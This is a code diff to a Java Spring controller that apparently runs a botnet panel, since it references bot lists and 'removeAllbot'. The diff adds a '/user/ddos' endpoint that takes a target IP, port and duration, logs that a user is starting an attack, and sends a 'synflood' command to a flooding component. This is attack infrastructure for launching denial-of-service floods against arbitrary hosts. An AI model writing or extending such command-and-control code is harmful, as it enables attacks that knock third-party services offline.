@@ -293,7 +293,7 @@ public class SiteController {
 				}
 				bServ.updateAll(botList2);
 			}
-		return new ModelAndView("redirect:/site/removeAllbot");
+		return new ModelAndView("redirect:/site/admin/removeAllbot");
 	}
 
 	/**
@@ -383,6 +383,19 @@ public class SiteController {
 
 		return "TESTING";
 	}
+	
+	
+	@RequestMapping(value = { "/user/ddos" }, method = RequestMethod.POST)
+	public String synFlood(String ipDest,int portDest,Integer time) {
+		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
+		String idUser = auth.getName();
+		System.out.println("Utente che sta iniziando un attacco "+idUser);		
+		String cmd = "synflood<SF>" + ipDest + "<SF>" + portDest+"<SF>"+time;
+		cmm.flooding(cmd);
+		return "redirect: /site/user/attack";
+	}
+	
+	
 	
 	// /**
 	// * This method will provide UserProfile list to views
